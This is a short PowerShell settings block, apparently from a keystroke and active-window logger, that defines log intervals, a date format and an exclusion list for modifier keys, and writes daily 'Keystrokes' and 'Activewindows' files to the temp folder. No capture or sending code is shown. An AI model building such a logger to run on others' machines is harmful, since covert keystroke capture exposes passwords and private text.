## log output interval (sec)
$C_interval = 60

## wait time (msec)
$C_waittime = 40
$C_windows_getting_interval = 6000

## date format
$C_dateformat = "yyyy/MM/dd HH:mm"

## encode
$C_Encode = [System.Text.Encoding]::Unicode

## output folder
$C_output_folder = "$env:temp"

## output file name
$C_output_filename = "Keystrokes_{{date_str}}.txt"
$C_output_filename2 = "Activewindows_{{date_str}}.txt"

## output path
$date_str = (Get-Date).ToString("yyMMdd")
$C_output_path = Join-path $C_output_folder $C_output_filename
$C_output_path = $C_output_path.Replace("{{date_str}}", $date_str)

$C_output_path2 = Join-path $C_output_folder $C_output_filename2
$C_output_path2 = $C_output_path2.Replace("{{date_str}}", $date_str)


## exclusion list
$C_exclusion_words = @("Shift","Ctrl","Win","Alt","Left","Right","Up","Down")
